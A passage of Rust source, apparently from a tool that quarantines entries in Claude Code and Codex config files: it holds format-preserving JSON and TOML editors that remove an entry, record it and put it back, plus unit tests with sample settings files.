//! The editors that take one entry out of a shared config file and put it
//! back.
//!
//! A file Item moves into the quarantine store whole. An entry Item cannot: it
//! shares its file with everything else the Agent reads there, so the only way
//! to take it out of the Surface is to rewrite the file without it (spec
//! section 5.2). Rewriting somebody else's configuration is the dangerous half
//! of a Quarantine, so both editors here promise the same three things:
//!
//! - **Nothing but the entry moves.** The TOML editor is format preserving:
//!   comments, blank lines, key order and the spelling of every untouched
//!   value come out as they went in. The JSON writer preserves key order and
//!   writes two spaces of indentation and one trailing newline, which is what
//!   both Agents write themselves, so a file either Agent wrote comes back
//!   byte for byte.
//! - **Every edit can be undone exactly.** Each one answers with a [`Kept`]
//!   record: what was taken out, where it sat, and for a TOML layer the bytes
//!   that went, so an untouched layer comes back to the byte. The quarantine
//!   store holds the record beside the Receipt's payload, and [`put_back`]
//!   re-inserts the entry into the file as it stands now, which is what spec
//!   section 5.4 asks for when the file has changed since.
//! - **The editors decide nothing.** Which entry goes is the Surface Adapter's
//!   answer and whether it may go at all is the eligibility table's.
//!
//! [`comment_out`] is the third editor, for the kinds that are neutralised
//! where they lie rather than taken out. It puts
//! `# agentsweep: quarantined <receipt id>` in front of the lines that make
//! the file a Surface, and [`switch_back`] takes that prefix off again. The
//! receipt id is in the prefix so that switching back touches exactly the
//! lines one Quarantine commented out and nothing a person wrote themselves.

use std::fmt;

use serde_json::{Map, Value};

/// How a configuration file is written.
#[derive(Clone, Copy, Debug, Eq, PartialEq)]
pub enum Format {
    /// Every Claude Code Surface, the Codex hooks file and both Claude Code
    /// registries.
    Json,
    /// Every Codex config layer.
    Toml,
}

impl Format {
    /// The spelling a kept record carries.
    pub fn as_str(self) -> &'static str {
        match self {
            Format::Json => "json",
            Format::Toml => "toml",
        }
    }

    /// Reads back the spelling a kept record carries.
    pub fn parse(text: &str) -> Option<Format> {
        match text {
            "json" => Some(Format::Json),
            "toml" => Some(Format::Toml),
            _ => None,
        }
    }
}

impl fmt::Display for Format {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        f.write_str(self.as_str())
    }
}

/// Where one entry sits inside a config document: its key path, as segments.
///
/// A segment is a key name or the decimal index of an element of a list. The
/// segments are kept apart rather than joined, because a key name holds dots
/// often enough that a dotted path cannot be taken apart again:
/// `[projects."/Users/u/demo"]` and `env.NODE_OPTIONS` are both one segment
/// deeper than they look.
#[derive(Clone, Debug, Default, Eq, PartialEq)]
pub struct EntryPath(Vec<String>);

impl EntryPath {
    /// A path from its segments.
    pub fn of<S: AsRef<str>>(segments: &[S]) -> EntryPath {
        EntryPath(
            segments
                .iter()
                .map(|segment| segment.as_ref().to_string())
                .collect(),
        )
    }

    /// The path one segment further down.
    pub fn child(&self, segment: impl Into<String>) -> EntryPath {
        let mut segments = self.0.clone();
        segments.push(segment.into());
        EntryPath(segments)
    }

    /// The path an Item's locator carries after the `#`, read back: a JSON
    /// pointer, with `~1` for a slash and `~0` for a tilde.
    pub fn from_pointer(pointer: &str) -> Option<EntryPath> {
        if pointer.is_empty() {
            return Some(EntryPath::default());
        }
        let rest = pointer.strip_prefix('/')?;
        Some(EntryPath(
            rest.split('/')
                .map(|segment| segment.replace("~1", "/").replace("~0", "~"))
                .collect(),
        ))
    }

    /// The JSON pointer an ItemId carries, which is also what a Receipt step
    /// records as its locator.
    pub fn pointer(&self) -> String {
        let mut out = String::new();
        for segment in &self.0 {
            out.push('/');
            out.push_str(&segment.replace('~', "~0").replace('/', "~1"));
        }
        out
    }

    /// The segments.
    pub fn segments(&self) -> &[String] {
        &self.0
    }

    /// The last segment, empty for the path that names the whole document.
    pub fn last(&self) -> &str {
        self.0.last().map(String::as_str).unwrap_or_default()
    }

    /// The path of the thing this one sits in.
    pub fn parent(&self) -> EntryPath {
        let mut segments = self.0.clone();
        segments.pop();
        EntryPath(segments)
    }

    /// True when the path names nothing.
    pub fn is_empty(&self) -> bool {
        self.0.is_empty()
    }
}

impl fmt::Display for EntryPath {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        f.write_str(&self.pointer())
    }
}

/// Why one edit could not be made.
#[derive(Clone, Debug, Eq, PartialEq)]
pub enum EditError {
    /// The file does not parse as the format it is read as. Nothing is ever
    /// written over a file this scanner could not read.
    Unparseable(String),
    /// Nothing sits at the key path.
    Absent(String),
    /// Something else took the key path, so putting the entry back would lose
    /// what is there now.
    Taken(String),
}

impl fmt::Display for EditError {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        match self {
            EditError::Unparseable(detail) => write!(f, "the file does not parse: {detail}"),
            EditError::Absent(path) => write!(f, "nothing is at {path} any more"),
            EditError::Taken(path) => write!(f, "something else is at {path}"),
        }
    }
}

impl std::error::Error for EditError {}

/// What one edit of a TOML layer took out, to the byte.
///
/// The TOML editor changes nothing but the entry, so the file it writes is the
/// file it read with one stretch of bytes missing. Keeping that stretch and
/// where it sat is what lets a Restore put an untouched layer back exactly as
/// it was written, comments, blank lines and table order included.
#[derive(Clone, Debug, Eq, PartialEq)]
pub struct Splice {
    /// How many bytes of the file came before the stretch.
    pub at: usize,
    /// The bytes themselves.
    pub text: String,
    /// The hash of the file as the edit wrote it, so the splice is used only
    /// while the file is still the one the edit left behind.
    pub wrote: String,
}

/// What one reversible edit did, as the quarantine store keeps it.
///
/// It holds the entry itself, which is content and may hold sensitive values,
/// so it lives in the store beside the Receipt's payload and never in the
/// Event Log: a record carries the hash of a sensitive value and nothing else
/// (spec section 5.5).
#[derive(Clone, Debug, Eq, PartialEq)]
pub struct Kept {
    /// How the file is written.
    pub format: Format,
    /// Where the entry sat.
    pub path: EntryPath,
    /// The entry itself, absent when the edit set a key that had nothing in
    /// it.
    pub value: Option<Value>,
    /// Its place among its siblings, so it goes back where it was rather than
    /// at the end.
    pub index: usize,
    /// The bytes one TOML edit took out, absent for a JSON file, which is
    /// written whole.
    pub splice: Option<Splice>,
    /// True when the edit set a value and left the key where it was, which is
    /// what the Agent's own switch is flipped with.
    pub was_set: bool,
}

impl Kept {
    /// The record as the store writes it.
    pub fn to_bytes(&self) -> Vec<u8> {
        let mut map = Map::new();
        map.insert("format".to_string(), Value::from(self.format.as_str()));
        map.insert("index".to_string(), Value::from(self.index as u64));
        map.insert(
            "path".to_string(),
            Value::Array(
                self.path
                    .segments()
                    .iter()
                    .map(|segment| Value::from(segment.as_str()))
                    .collect(),
            ),
        );
        if let Some(splice) = &self.splice {
            let mut written = Map::new();
            written.insert("at".to_string(), Value::from(splice.at as u64));
            written.insert("text".to_string(), Value::from(splice.text.as_str()));
            written.insert("wrote".to_string(), Value::from(splice.wrote.as_str()));
            map.insert("splice".to_string(), Value::Object(written));
        }
        map.insert(
            "value".to_string(),
            self.value.clone().unwrap_or(Value::Null),
        );
        map.insert("was_set".to_string(), Value::from(self.was_set));
        Value::Object(map).to_string().into_bytes()
    }

    /// Reads back what the store wrote, absent when it is not a record.
    pub fn parse(bytes: &[u8]) -> Option<Kept> {
        let value: Value = serde_json::from_slice(bytes).ok()?;
        let segments: Vec<String> = value
            .get("path")?
            .as_array()?
            .iter()
            .map(|segment| segment.as_str().unwrap_or_default().to_string())
            .collect();
        let splice = match value.get("splice") {
            Some(written) => Some(Splice {
                at: written.get("at")?.as_u64()? as usize,
                text: written.get("text")?.as_str()?.to_string(),
                wrote: written.get("wrote")?.as_str()?.to_string(),
            }),
            None => None,
        };
        let held = value.get("value")?;
        Some(Kept {
            format: Format::parse(value.get("format")?.as_str()?)?,
            path: EntryPath::of(&segments),
            value: match held {
                Value::Null => None,
                held => Some(held.clone()),
            },
            index: value.get("index")?.as_u64()? as usize,
            splice,
            was_set: value.get("was_set")?.as_bool()?,
        })
    }
}

/// One edit: the file as it is to be written, and what to keep so that it can
/// be undone.
#[derive(Clone, Debug, Eq, PartialEq)]
pub struct Edit {
    /// The whole file, as it is to be written.
    pub text: String,
    /// What was taken out or changed.
    pub kept: Kept,
}

/// Drops one entry out of a config file.
pub fn remove_entry(format: Format, text: &str, path: &EntryPath) -> Result<Edit, EditError> {
    match format {
        Format::Json => json::remove(text, path),
        Format::Toml => toml::remove(text, path),
    }
}

/// Sets one key to one value, remembering what was there. What the Agent's own
/// switch is flipped with, and never a Quarantine's only step (spec section
/// 5.2).
pub fn set_entry(
    format: Format,
    text: &str,
    path: &EntryPath,
    value: &Value,
) -> Result<Edit, EditError> {
    match format {
        Format::Json => json::set(text, path, value),
        Format::Toml => toml::set(text, path, value),
    }
}

/// The value at one key path, absent when nothing is there.
pub fn read_entry(format: Format, text: &str, path: &EntryPath) -> Option<Value> {
    match format {
        Format::Json => json::read(text, path),
        Format::Toml => toml::read(text, path),
    }
}

/// Puts one entry back into the file as it stands now.
///
/// A TOML layer nothing else has touched is put back to the byte. Anything
/// else is re-inserted at the key path it came from, which is the case spec
/// section 5.4 names: the entry goes back into the current file rather than
/// the current file being replaced. A key path something else has taken is
/// refused unless `replace` says to write over it.
pub fn put_back(text: &str, kept: &Kept, replace: bool) -> Result<String, EditError> {
    if let Some(splice) = &kept.splice
        && !kept.was_set
        && crate::item::sha256_hex(text.as_bytes()) == splice.wrote
        && splice.at <= text.len()
    {
        let mut put = String::with_capacity(text.len() + splice.text.len());
        put.push_str(&text[..splice.at]);
        put.push_str(&splice.text);
        put.push_str(&text[splice.at..]);
        return Ok(put);
    }
    match kept.format {
        Format::Json => json::put_back(text, kept, replace),
        Format::Toml => toml::put_back(text, kept, replace),
    }
}

/// The comment that marks a line one Quarantine switched off.
fn banner(receipt_id: &str) -> String {
    format!("# agentsweep: quarantined {receipt_id} ")
}

/// Comments the chosen lines out where they lie, each behind the receipt id
/// that switched it off.
///
/// The prefix goes after whatever the line is indented with, so switching back
/// gives the line its own indentation again, byte for byte. A line this
/// Receipt has already commented out is left alone.
pub fn comment_out(text: &str, receipt_id: &str, lines: &[usize]) -> String {
    let prefix = banner(receipt_id);
    let mut out = String::with_capacity(text.len() + lines.len() * prefix.len());
    for (number, line) in split_lines(text) {
        let indent = line.len() - line.trim_start().len();
        if lines.contains(&number) && !line[indent..].starts_with(&prefix) {
            out.push_str(&line[..indent]);
            out.push_str(&prefix);
            out.push_str(&line[indent..]);
        } else {
            out.push_str(line);
        }
    }
    out
}

/// Takes the prefix of one Receipt off every line that carries it, and says
/// how many lines it switched back on.
pub fn switch_back(text: &str, receipt_id: &str) -> (String, usize) {
    let prefix = banner(receipt_id);
    let mut out = String::with_capacity(text.len());
    let mut switched = 0;
    for (_, line) in split_lines(text) {
        let indent = line.len() - line.trim_start().len();
        match line[indent..].strip_prefix(&prefix) {
            Some(rest) => {
                switched += 1;
                out.push_str(&line[..indent]);
                out.push_str(rest);
            }
            None => out.push_str(line),
        }
    }
    (out, switched)
}

/// True when a line was commented out by a Quarantine, whichever one.
///
/// A Surface Adapter reads it to leave a line one Receipt already switched off
/// alone, so two Quarantines of the same file never nest their prefixes.
pub fn is_neutralised(line: &str) -> bool {
    line.trim_start().starts_with("# agentsweep: quarantined ")
}

/// The numbers of the lines a text holds, from zero, with their line endings
/// still on them, so that putting them back together is the text again.
pub fn lines_of(text: &str) -> Vec<(usize, &str)> {
    split_lines(text)
}

fn split_lines(text: &str) -> Vec<(usize, &str)> {
    let mut lines = Vec::new();
    let mut start = 0;
    for (index, byte) in text.bytes().enumerate() {
        if byte == b'\n' {
            lines.push((lines.len(), &text[start..=index]));
            start = index + 1;
        }
    }
    if start < text.len() {
        lines.push((lines.len(), &text[start..]));
    }
    lines
}

/// The order-preserving, two-space JSON writer.
///
/// Both Agents write their JSON the way `JSON.stringify(value, null, 2)` does,
/// so that is what comes back: two spaces of indentation, the keys in the
/// order they were written, one trailing newline.
mod json {
    use super::{Edit, EditError, EntryPath, Format, Kept};

    use serde_json::Value;

    /// The whole file, written the way both Agents write it.
    pub(super) fn render(value: &Value) -> String {
        let mut text = serde_json::to_string_pretty(value).unwrap_or_else(|_| value.to_string());
        text.push('\n');
        text
    }

    fn parse(text: &str) -> Result<Value, EditError> {
        serde_json::from_str(text).map_err(|error| EditError::Unparseable(error.to_string()))
    }

    /// The value at a key path.
    fn at<'a>(value: &'a Value, path: &EntryPath) -> Option<&'a Value> {
        let mut current = value;
        for segment in path.segments() {
            current = match current {
                Value::Object(fields) => fields.get(segment)?,
                Value::Array(items) => items.get(segment.parse::<usize>().ok()?)?,
                _ => return None,
            };
        }
        Some(current)
    }

    /// The thing a key path sits in, to write to.
    fn parent_of<'a>(value: &'a mut Value, path: &EntryPath) -> Option<&'a mut Value> {
        let segments = path.segments();
        let (_, above) = segments.split_last()?;
        let mut current = value;
        for segment in above {
            current = match current {
                Value::Object(fields) => fields.get_mut(segment)?,
                Value::Array(items) => items.get_mut(segment.parse::<usize>().ok()?)?,
                _ => return None,
            };
        }
        Some(current)
    }

    pub(super) fn read(text: &str, path: &EntryPath) -> Option<Value> {
        at(&parse(text).ok()?, path).cloned()
    }

    pub(super) fn remove(text: &str, path: &EntryPath) -> Result<Edit, EditError> {
        let mut document = parse(text)?;
        let name = path.last().to_string();
        let absent = || EditError::Absent(path.pointer());
        let parent = parent_of(&mut document, path).ok_or_else(absent)?;
        let (index, taken) = match parent {
            Value::Object(fields) => {
                let index = fields
                    .keys()
                    .position(|key| *key == name)
                    .ok_or_else(absent)?;
                // `shift_remove` and not `remove`: with `preserve_order` the
                // second one swaps the last key into the hole and the file
                // would come out in another order.
                let taken = fields.shift_remove(&name).ok_or_else(absent)?;
                (index, taken)
            }
            Value::Array(items) => {
                let index: usize = name.parse().map_err(|_| absent())?;
                if index >= items.len() {
                    return Err(absent());
                }
                (index, items.remove(index))
            }
            _ => return Err(absent()),
        };
        Ok(Edit {
            text: render(&document),
            kept: Kept {
                format: Format::Json,
                path: path.clone(),
                value: Some(taken),
                index,
                splice: None,
                was_set: false,
            },
        })
    }

    pub(super) fn set(text: &str, path: &EntryPath, value: &Value) -> Result<Edit, EditError> {
        let mut document = parse(text)?;
        let name = path.last().to_string();
        let absent = || EditError::Absent(path.pointer());
        let before = at(&document, path).cloned();
        let parent = parent_of(&mut document, path).ok_or_else(absent)?;
        let index = match parent {
            Value::Object(fields) => {
                let index = fields.keys().position(|key| *key == name);
                fields.insert(name.clone(), value.clone());
                index.unwrap_or(fields.len().saturating_sub(1))
            }
            Value::Array(items) => {
                let index: usize = name.parse().map_err(|_| absent())?;
                *items.get_mut(index).ok_or_else(absent)? = value.clone();
                index
            }
            _ => return Err(absent()),
        };
        Ok(Edit {
            text: render(&document),
            kept: Kept {
                format: Format::Json,
                path: path.clone(),
                value: before,
                index,
                splice: None,
                was_set: true,
            },
        })
    }

    pub(super) fn put_back(text: &str, kept: &Kept, replace: bool) -> Result<String, EditError> {
        let mut document = parse(text)?;
        let path = &kept.path;
        let name = path.last().to_string();
        let absent = || EditError::Absent(path.pointer());
        let held = at(&document, path).cloned();

        if kept.was_set {
            let Some(Value::Object(fields)) = parent_of(&mut document, path) else {
                return Err(absent());
            };
            match &kept.value {
                // The key was not there before the switch was flipped, so
                // reversing it takes the key away again.
                None => {
                    fields.shift_remove(&name);
                }
                Some(before) => {
                    fields.insert(name.clone(), before.clone());
                }
            }
            return Ok(render(&document));
        }

        let entry = kept.value.clone().ok_or_else(absent)?;
        match parent_of(&mut document, path).ok_or_else(absent)? {
            Value::Object(fields) => {
                // A named key something else has taken is the conflict of spec
                // section 5.4, and the user picks. One element of a list is
                // never a conflict: its neighbours simply move along.
                if let Some(held) = held {
                    if held == entry {
                        // It is already back: a Restore tried twice, or a live
                        // session that wrote the entry again by itself.
                        return Ok(text.to_string());
                    }
                    if !replace {
                        return Err(EditError::Taken(path.pointer()));
                    }
                }
                fields.shift_remove(&name);
                // `shift_insert` puts the key back where it was; `insert`
                // would append it and the file would come out reordered.
                fields.shift_insert(kept.index.min(fields.len()), name, entry);
            }
            Value::Array(items) => {
                let index = kept.index.min(items.len());
                items.insert(index, entry);
            }
            _ => return Err(absent()),
        }
        Ok(render(&document))
    }
}

/// The format-preserving TOML editor.
///
/// Everything a Codex config layer holds but the entry itself comes out the
/// way it went in: comments, blank lines, the order of the tables and the
/// spelling of every value. That is what `toml_edit` is for, and it is why
/// RemoveEntry on a config layer is an edit rather than a re-serialisation.
mod toml {
    use super::{Edit, EditError, EntryPath, Format, Kept, Splice};

    use serde_json::{Map, Value};
    use toml_edit::{DocumentMut, Item, Key, Table, Value as TomlValue};

    fn parse(text: &str) -> Result<DocumentMut, EditError> {
        text.parse::<DocumentMut>()
            .map_err(|error| EditError::Unparseable(error.to_string()))
    }

    /// The item at a key path.
    fn at<'a>(document: &'a DocumentMut, path: &EntryPath) -> Option<&'a Item> {
        let mut current = document.as_item();
        for segment in path.segments() {
            current = current.get(segment.as_str()).or_else(|| {
                segment
                    .parse::<usize>()
                    .ok()
                    .and_then(|index| current.get(index))
            })?;
        }
        Some(current)
    }

    /// The thing a key path sits in, to write to. Nothing is created on the
    /// way: a path that is not there yields nothing rather than a hole in the
    /// file.
    fn parent_of<'a>(document: &'a mut DocumentMut, path: &EntryPath) -> Option<&'a mut Item> {
        let segments = path.segments();
        let (_, above) = segments.split_last()?;
        let mut current = document.as_item_mut();
        for segment in above {
            let by_name = current.get(segment.as_str()).is_some();
            current = match by_name {
                true => current.get_mut(segment.as_str())?,
                false => {
                    let index: usize = segment.parse().ok()?;
                    current.get_mut(index)?
                }
            };
        }
        Some(current)
    }

    pub(super) fn read(text: &str, path: &EntryPath) -> Option<Value> {
        at(&parse(text).ok()?, path).map(json_of)
    }

    /// What one edit did to the text, as the bytes that went and where they
    /// sat. The editor changes nothing but the entry, so the two texts share a
    /// prefix and a suffix and differ in one stretch between them.
    fn splice_of(before: &str, after: &str) -> Splice {
        let head = before
            .as_bytes()
            .iter()
            .zip(after.as_bytes())
            .take_while(|(one, other)| one == other)
            .count();
        let head = floor_boundary(before, head);
        let tail = before.as_bytes()[head..]
            .iter()
            .rev()
            .zip(after.as_bytes()[head..].iter().rev())
            .take_while(|(one, other)| one == other)
            .count();
        let end = floor_boundary(before, before.len() - tail).max(head);
        Splice {
            at: head,
            text: before[head..end].to_string(),
            wrote: crate::item::sha256_hex(after.as_bytes()),
        }
    }

    /// The nearest character boundary at or before an offset, so a splice
    /// never cuts a character in half.
    fn floor_boundary(text: &str, mut at: usize) -> usize {
        while at > 0 && !text.is_char_boundary(at) {
            at -= 1;
        }
        at
    }

    pub(super) fn remove(text: &str, path: &EntryPath) -> Result<Edit, EditError> {
        let mut document = parse(text)?;
        let name = path.last().to_string();
        let absent = || EditError::Absent(path.pointer());
        let taken = at(&document, path).map(json_of).ok_or_else(absent)?;
        let parent = parent_of(&mut document, path).ok_or_else(absent)?;
        let index = match parent.as_table_like_mut() {
            Some(table) => {
                let index = table
                    .iter()
                    .position(|(key, _)| key == name)
                    .ok_or_else(absent)?;
                table.remove(&name).ok_or_else(absent)?;
                index
            }
            None => {
                let index: usize = name.parse().map_err(|_| absent())?;
                if let Some(tables) = parent.as_array_of_tables_mut() {
                    if index >= tables.len() {
                        return Err(absent());
                    }
                    tables.remove(index);
                } else if let Some(array) = parent.as_array_mut() {
                    if index >= array.len() {
                        return Err(absent());
                    }
                    array.remove(index);
                } else {
                    return Err(absent());
                }
                index
            }
        };
        let written = document.to_string();
        Ok(Edit {
            kept: Kept {
                format: Format::Toml,
                path: path.clone(),
                value: Some(taken),
                index,
                splice: Some(splice_of(text, &written)),
                was_set: false,
            },
            text: written,
        })
    }

    pub(super) fn set(text: &str, path: &EntryPath, value: &Value) -> Result<Edit, EditError> {
        let mut document = parse(text)?;
        let name = path.last().to_string();
        let absent = || EditError::Absent(path.pointer());
        let before = at(&document, path).map(json_of);
        let parent = parent_of(&mut document, path).ok_or_else(absent)?;
        let table = parent.as_table_like_mut().ok_or_else(absent)?;
        let index = table
            .iter()
            .position(|(key, _)| key == name)
            .unwrap_or(table.len());
        table.insert(&name, item_of(value));
        let written = document.to_string();
        Ok(Edit {
            kept: Kept {
                format: Format::Toml,
                path: path.clone(),
                value: before,
                index,
                splice: Some(splice_of(text, &written)),
                was_set: true,
            },
            text: written,
        })
    }

    pub(super) fn put_back(text: &str, kept: &Kept, replace: bool) -> Result<String, EditError> {
        let mut document = parse(text)?;
        let path = &kept.path;
        let name = path.last().to_string();
        let absent = || EditError::Absent(path.pointer());
        let held = at(&document, path).map(json_of);

        if kept.was_set {
            let parent = parent_of(&mut document, path).ok_or_else(absent)?;
            let table = parent.as_table_like_mut().ok_or_else(absent)?;
            match &kept.value {
                None => {
                    table.remove(&name);
                }
                Some(before) => {
                    table.insert(&name, item_of(before));
                }
            }
            return Ok(document.to_string());
        }

        let entry = kept.value.clone().ok_or_else(absent)?;
        let parent = parent_of(&mut document, path).ok_or_else(absent)?;
        if let Some(table) = parent.as_table_like_mut() {
            // A named key something else has taken is the conflict of spec
            // section 5.4, and the user picks. One element of a list is never
            // a conflict: its neighbours simply move along.
            if let Some(held) = &held {
                if *held == entry {
                    return Ok(text.to_string());
                }
                if !replace {
                    return Err(EditError::Taken(path.pointer()));
                }
            }
            // The entry goes back among its siblings where it was: everything
            // from its place on is lifted off and put down again behind it.
            let names: Vec<String> = table
                .iter()
                .map(|(key, _)| key.to_string())
                .skip(kept.index.min(table.len()))
                .collect();
            let mut tail: Vec<(Key, Item)> = Vec::new();
            for name in names {
                let Some(key) = table.key(&name).cloned() else {
                    continue;
                };
                if let Some(item) = table.remove(&name) {
                    tail.push((key, item));
                }
            }
            table.insert(&name, item_of(&entry));
            for (key, item) in tail {
                if key.get() != name {
                    table.entry_format(&key).or_insert(item);
                }
            }
            return Ok(document.to_string());
        }
        let index: usize = name.parse().map_err(|_| absent())?;
        if let Some(tables) = parent.as_array_of_tables_mut() {
            let table = item_of(&entry)
                .into_table()
                .map_err(|_| EditError::Unparseable("the entry is not a table".to_string()))?;
            let index = index.min(tables.len());
            tables.insert(index, table);
            return Ok(document.to_string());
        }
        let array = parent.as_array_mut().ok_or_else(absent)?;
        let value = item_of(&entry)
            .into_value()
            .map_err(|_| EditError::Unparseable("the entry is not a value".to_string()))?;
        array.insert(index.min(array.len()), value);
        Ok(document.to_string())
    }

    /// One TOML item as the JSON the views and the canonical forms are written
    /// against. A date, a time and a date-time travel as the string they were
    /// written as, the way the Codex adapter's reader carries them.
    pub(super) fn json_of(item: &Item) -> Value {
        match item {
            Item::None => Value::Null,
            Item::Value(value) => json_of_value(value),
            Item::Table(table) => json_of_table(table),
            Item::ArrayOfTables(tables) => Value::Array(tables.iter().map(json_of_table).collect()),
        }
    }

    fn json_of_table(table: &Table) -> Value {
        let mut fields = Map::new();
        for (name, item) in table.iter() {
            fields.insert(name.to_string(), json_of(item));
        }
        Value::Object(fields)
    }

    fn json_of_value(value: &TomlValue) -> Value {
        match value {
            TomlValue::String(text) => Value::String(text.value().clone()),
            TomlValue::Integer(number) => Value::from(*number.value()),
            TomlValue::Float(number) => serde_json::Number::from_f64(*number.value())
                .map(Value::Number)
                .unwrap_or_else(|| Value::String(number.value().to_string())),
            TomlValue::Boolean(flag) => Value::Bool(*flag.value()),
            TomlValue::Datetime(stamp) => Value::String(stamp.value().to_string()),
            TomlValue::Array(array) => Value::Array(array.iter().map(json_of_value).collect()),
            TomlValue::InlineTable(table) => {
                let mut fields = Map::new();
                for (name, held) in table.iter() {
                    fields.insert(name.to_string(), json_of_value(held));
                }
                Value::Object(fields)
            }
        }
    }

    /// One JSON value as the TOML item it is written as. What a Restore into a
    /// layer that has changed since builds the entry from; the layer it came
    /// out of is put back to the byte instead.
    fn item_of(value: &Value) -> Item {
        match value {
            Value::Object(fields) => {
                let mut table = Table::new();
                for (name, held) in fields {
                    table.insert(name, item_of(held));
                }
                Item::Table(table)
            }
            other => match toml_value_of(other) {
                Some(value) => Item::Value(value),
                None => Item::None,
            },
        }
    }

    fn toml_value_of(value: &Value) -> Option<TomlValue> {
        Some(match value {
            Value::Null => return None,
            Value::Bool(flag) => TomlValue::from(*flag),
            Value::Number(number) => match number.as_i64() {
                Some(whole) => TomlValue::from(whole),
                None => TomlValue::from(number.as_f64().unwrap_or_default()),
            },
            Value::String(text) => TomlValue::from(text.as_str()),
            Value::Array(items) => {
                let mut array = toml_edit::Array::new();
                for held in items {
                    if let Some(value) = toml_value_of(held) {
                        array.push(value);
                    }
                }
                TomlValue::Array(array)
            }
            Value::Object(fields) => {
                let mut table = toml_edit::InlineTable::new();
                for (name, held) in fields {
                    if let Some(value) = toml_value_of(held) {
                        table.insert(name, value);
                    }
                }
                TomlValue::InlineTable(table)
            }
        })
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    use serde_json::json;

    /// A Claude Code settings file as Claude Code writes it: two spaces, keys
    /// in the order they were written, one trailing newline.
    const SETTINGS: &str = r#"{
  "$schema": "https://json.schemastore.org/claude-code-settings.json",
  "model": "opus",
  "statusLine": {
    "type": "command",
    "command": "~/.claude/statusline.sh"
  },
  "env": {
    "NODE_OPTIONS": "--max-old-space-size=8192"
  },
  "permissions": {
    "allow": [
      "Bash(cargo test *)",
      "Bash(php artisan *)"
    ]
  }
}
"#;

    /// A Codex config layer with the two things a re-serialisation would lose:
    /// comments and a chosen order.
    const LAYER: &str = r#"# A user layer. Nothing here is a real endpoint.
model = "gpt-5-codex"
approval_policy = "never"

[features]
hooks = true

[mcp_servers.notes]
command = "npx"
args = ["-y", "@modelcontextprotocol/server-everything"]

# The planted one.
[mcp_servers.planted]
command = "node"
args = ["~/.dev-utils/index.js"]

[projects."/src/demo"]
trust_level = "trusted"
"#;

    fn path(segments: &[&str]) -> EntryPath {
        EntryPath::of(segments)
    }

    /// The whole reason `preserve_order` is asked for in this crate's
    /// manifest: a settings file must come back with its keys where they were,
    /// and `serde_json` keeps them only when that feature is on.
    #[test]
    fn the_json_writer_preserves_key_order() {
        let value: Value = serde_json::from_str(SETTINGS).expect("a settings file");
        let names: Vec<&str> = value
            .as_object()
            .expect("an object")
            .keys()
            .map(String::as_str)
            .collect();
        assert_eq!(
            names,
            ["$schema", "model", "statusLine", "env", "permissions"],
            "serde_json is not built with preserve_order"
        );
        assert_eq!(json::render(&value), SETTINGS);
    }

    #[test]
    fn removing_a_json_key_leaves_every_other_key_where_it_was() {
        let edit = remove_entry(Format::Json, SETTINGS, &path(&["statusLine"]))
            .expect("the key comes out");

        assert!(!edit.text.contains("statusLine"), "{}", edit.text);
        assert!(edit.text.starts_with("{\n  \"$schema\""), "{}", edit.text);
        assert!(edit.text.ends_with("}\n"), "{}", edit.text);
        let left: Value = serde_json::from_str(&edit.text).expect("still a settings file");
        let names: Vec<&str> = left
            .as_object()
            .expect("an object")
            .keys()
            .map(String::as_str)
            .collect();
        assert_eq!(names, ["$schema", "model", "env", "permissions"]);
        assert_eq!(edit.kept.index, 2);

        let back = put_back(&edit.text, &edit.kept, false).expect("the key goes back");
        assert_eq!(back, SETTINGS);
    }

    #[test]
    fn a_settings_key_that_is_one_element_of_a_list_comes_out_and_goes_back_in_its_place() {
        let entry = path(&["permissions", "allow", "0"]);
        let edit = remove_entry(Format::Json, SETTINGS, &entry).expect("the element comes out");

        assert!(!edit.text.contains("cargo test"), "{}", edit.text);
        assert!(edit.text.contains("php artisan"), "{}", edit.text);

        let back = put_back(&edit.text, &edit.kept, false).expect("the element goes back");
        assert_eq!(back, SETTINGS);
    }

    /// Spec section 5.4: an entry whose file changed since is re-inserted into
    /// the current file, not written over it.
    #[test]
    fn an_entry_goes_back_into_a_json_file_that_changed_since() {
        let edit = remove_entry(Format::Json, SETTINGS, &path(&["statusLine"]))
            .expect("the key comes out");
        let mut changed: Value = serde_json::from_str(&edit.text).expect("a settings file");
        changed["model"] = Value::from("sonnet");
        changed
            .as_object_mut()
            .expect("an object")
            .insert("cleanupPeriodDays".to_string(), Value::from(30));

        let back = put_back(&json::render(&changed), &edit.kept, false).expect("the key goes back");

        let after: Value = serde_json::from_str(&back).expect("a settings file");
        assert_eq!(after["model"], "sonnet");
        assert_eq!(after["cleanupPeriodDays"], 30);
        assert_eq!(after["statusLine"]["command"], "~/.claude/statusline.sh");
        let names: Vec<&str> = after
            .as_object()
            .expect("an object")
            .keys()
            .map(String::as_str)
            .collect();
        assert_eq!(
            names,
            [
                "$schema",
                "model",
                "statusLine",
                "env",
                "permissions",
                "cleanupPeriodDays"
            ]
        );
    }

    #[test]
    fn a_json_key_something_else_took_is_refused_and_replaced_only_when_asked() {
        let edit = remove_entry(Format::Json, SETTINGS, &path(&["statusLine"]))
            .expect("the key comes out");
        let mut taken: Value = serde_json::from_str(&edit.text).expect("a settings file");
        taken
            .as_object_mut()
            .expect("an object")
            .insert("statusLine".to_string(), json!({"type": "command"}));
        let taken = json::render(&taken);

        assert_eq!(
            put_back(&taken, &edit.kept, false),
            Err(EditError::Taken("/statusLine".to_string()))
        );
        let replaced = put_back(&taken, &edit.kept, true).expect("the key is written over");
        let after: Value = serde_json::from_str(&replaced).expect("a settings file");
        assert_eq!(after["statusLine"]["command"], "~/.claude/statusline.sh");
    }

    #[test]
    fn setting_the_agents_own_switch_keeps_the_key_where_it_is_and_can_be_flipped_back() {
        let written = json::render(&json!({
            "enabledPlugins": {"notes@demo": true, "other@demo": true},
            "model": "opus",
        }));
        let entry = path(&["enabledPlugins", "notes@demo"]);

        let edit = set_entry(Format::Json, &written, &entry, &Value::from(false))
            .expect("the switch flips");

        let after: Value = serde_json::from_str(&edit.text).expect("a settings file");
        assert_eq!(after["enabledPlugins"]["notes@demo"], false);
        let names: Vec<&str> = after["enabledPlugins"]
            .as_object()
            .expect("an object")
            .keys()
            .map(String::as_str)
            .collect();
        assert_eq!(names, ["notes@demo", "other@demo"]);

        let back = put_back(&edit.text, &edit.kept, false).expect("the switch flips back");
        assert_eq!(back, written);
    }

    #[test]
